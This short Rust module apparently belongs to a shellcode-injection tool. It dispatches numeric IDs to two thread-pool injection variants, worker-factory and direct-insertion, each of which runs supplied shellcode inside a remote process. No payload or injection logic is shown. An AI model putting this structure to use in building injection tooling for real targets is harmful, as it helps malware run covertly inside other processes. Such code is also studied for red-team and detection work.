mod tp_worker_factory;
mod tp_direct_insertion;

use ghostptr::RemoteProcess;

use tp_direct_insertion::TpDirectInsertion;
use tp_worker_factory::TpWorkerFactory;

pub fn variant_from_id(id: u8) -> Option<Box<dyn Variant>> {
    match id {
        1 => Some(Box::new(TpWorkerFactory)),
		2 => Some(Box::new(TpDirectInsertion)),
        _ => None,
    }
}

pub trait Variant {
    fn run(&self, process: &RemoteProcess, shellcode: &[u8]) -> ghostptr::Result<()>;
}
